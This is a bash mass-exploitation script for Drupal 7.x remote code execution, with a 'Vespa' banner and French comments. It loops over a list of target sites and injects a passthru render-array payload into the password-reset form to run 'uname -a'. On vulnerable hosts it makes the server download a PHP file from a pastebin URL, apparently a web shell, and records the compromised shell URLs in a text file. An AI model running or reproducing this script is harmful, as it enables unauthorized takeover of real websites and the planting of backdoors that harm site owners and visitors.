#!/bin/bash

croustibat() {
    target=$1
    echo -ne "---";
    fondant=$(curl -s -X POST --cookie-jar cookie.tmp "${target}/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=uname+-a" --data "form_id=user_pass&_triggering_element_name=name" | grep form_build_id);
    echo -ne "-------";
    if [[ $fondant =~ 'value="form-' ]]; then
        echo -ne "--------------------------";
        token=$(curl -s -X POST -b cookie.tmp "${target}/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=uname+-a" --data "form_id=user_pass&_triggering_element_name=name" | grep form_build_id | grep -Po '(?<=value=")[^" \>]*' | head -1);
        echo -ne "----------------------------------";
        echo 
        result=$(curl -s -X POST -b cookie.tmp "${target}/?q=file/ajax/name/%23value/${token}" --data "form_build_id=${token}" | head -1)
        if [[ $result =~ 'Linux' ]]; then
          echo "Bv - VULN o RCE $target : uname -a"
          echo "$result";
          echo "Je tente ma chance ....."
          upload=$(curl -s -X POST -b cookie.tmp "${target}/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=curl+-o+sites/default/files/lol.php+"https://pastebin.com/raw/QDpuTY8B"" --data "form_id=user_pass&_triggering_element_name=name" | grep form_build_id | grep -Po '(?<=value=")[^" \>]*' | head -1);
          curl -s -X POST -b cookie.tmp "${target}/?q=file/ajax/name/%23value/${upload}" --data "form_build_id=${upload}" | head -1 > /dev/null
          cassoulet=$(curl -s "${target}/sites/default/files/lol.php");
          if [[ $cassoulet =~ 'Vespa' ]]; then
            echo "GG mek"
            echo "$result" >> montblanc.txt
            echo "$target/sites/default/files/lol.php" | tee -a montblanc.txt
            echo "=====================================" >> montblanc.txt
          else
            echo "Nan dsl"
            echo "$target" >> warzaxpp.txt
          fi
          echo "--------------------------------------------------------------------------"
        else
            echo "Dsl - PAS VULN $target"

        fi
    else
        echo
        echo "Dsl - PAS VULN $target";
    fi
}

cat << "banner"
------------------------------
 _    __                     
| |  / /__  _________  ____ _
| | / / _ \/ ___/ __ \/ __ `/
| |/ /  __(__  ) /_/ / /_/ / 
|___/\___/____/ .___/\__,_/  
             /_/                        
    
------[ RCE Drupal 7.x ]------
 
banner

for s in $(cat $1); do
    echo "CHECKING $s"
    echo -ne "----";
    croustibat $s
done
rm cookie.tmp
